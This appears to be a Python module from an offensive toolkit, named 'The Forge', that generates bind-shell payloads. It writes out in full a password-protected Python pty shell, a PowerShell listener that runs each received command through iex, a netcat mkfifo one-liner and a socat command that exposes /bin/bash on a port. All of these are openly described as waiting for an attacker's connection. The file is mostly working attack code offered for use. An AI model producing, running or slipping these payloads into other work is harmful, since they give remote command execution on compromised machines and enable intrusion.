"""
The Forge — Bind Shell
Authenticated bind shell that listens on target and waits for attacker connection.
"""

import textwrap
import base64
import hashlib


def generate_python(port: int, password: str = "forge", interface: str = "0.0.0.0") -> str:
    """Python bind shell with password authentication."""
    pwd_hash = hashlib.sha256(password.encode()).hexdigest()
    code = textwrap.dedent(f"""\
        import socket,subprocess,os,sys,hashlib,threading
        PORT={port}
        IFACE="{interface}"
        PWD_HASH="{pwd_hash}"

        def auth(conn):
            conn.send(b"Password: ")
            pwd=conn.recv(1024).strip()
            if hashlib.sha256(pwd).hexdigest()!=PWD_HASH:
                conn.send(b"[!] Access denied\\n")
                conn.close()
                return False
            conn.send(b"[+] Authenticated\\n")
            return True

        def handle(conn):
            if not auth(conn):
                return
            if os.name=='nt':
                proc=subprocess.Popen('cmd.exe',stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
            else:
                import pty
                parent,child=pty.openpty()
                proc=subprocess.Popen('/bin/bash',stdin=child,stdout=child,stderr=child,preexec_fn=os.setsid)
                os.close(child)

            def recv():
                while True:
                    try:
                        data=conn.recv(4096)
                        if not data:break
                        if os.name=='nt':
                            proc.stdin.write(data)
                            proc.stdin.flush()
                        else:
                            os.write(parent,data)
                    except:break
            def send():
                while True:
                    try:
                        if os.name=='nt':
                            out=proc.stdout.read1(4096)
                        else:
                            out=os.read(parent,4096)
                        if not out:break
                        conn.send(out)
                    except:break
            t1=threading.Thread(target=recv,daemon=True)
            t2=threading.Thread(target=send,daemon=True)
            t1.start()
            t2.start()
            proc.wait()
            conn.close()

        srv=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
        srv.bind((IFACE,PORT))
        srv.listen(1)
        while True:
            conn,addr=srv.accept()
            threading.Thread(target=handle,args=(conn,),daemon=True).start()
    """)
    return code


def generate_powershell(port: int, password: str = "forge") -> str:
    """PowerShell bind shell with authentication."""
    code = textwrap.dedent(f"""\
        $listener=New-Object System.Net.Sockets.TcpListener([System.Net.IPAddress]::Any,{port});
        $listener.Start();
        while($true){{
            $client=$listener.AcceptTcpClient();
            $stream=$client.GetStream();
            $writer=New-Object System.IO.StreamWriter($stream);
            $reader=New-Object System.IO.StreamReader($stream);
            $writer.AutoFlush=$true;
            $writer.Write("Password: ");
            $pwd=$reader.ReadLine();
            if($pwd -ne "{password}"){{
                $writer.Write("Access denied`n");
                $client.Close();
                continue
            }};
            $writer.Write("Authenticated`n");
            while($true){{
                $writer.Write("PS "+$(pwd).Path+"> ");
                $cmd=$reader.ReadLine();
                if($cmd -eq "exit"){{break}};
                try{{
                    $out=(iex $cmd 2>&1|Out-String);
                    $writer.Write($out)
                }}catch{{
                    $writer.Write($_.Exception.Message+"`n")
                }}
            }};
            $client.Close()
        }}
    """).strip()
    return code


def generate_netcat(port: int) -> str:
    """Netcat bind shell (no auth)."""
    return f'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -lvnp {port} >/tmp/f'


def generate_socat(port: int) -> str:
    """Socat bind shell with PTY."""
    return f'socat TCP-LISTEN:{port},reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane'


# ---------------------------------------------------------------------------
# Master Generator
# ---------------------------------------------------------------------------

VARIANTS = {
    "python": generate_python,
    "powershell": generate_powershell,
    "netcat": generate_netcat,
    "socat": generate_socat,
}


def generate(port: int, language: str = "python", **kwargs) -> str:
    gen_func = VARIANTS.get(language.lower())
    if not gen_func:
        raise ValueError(f"Unknown language: {language}. Available: {list(VARIANTS.keys())}")
    return gen_func(port, **kwargs)


def list_variants() -> list[str]:
    return list(VARIANTS.keys())
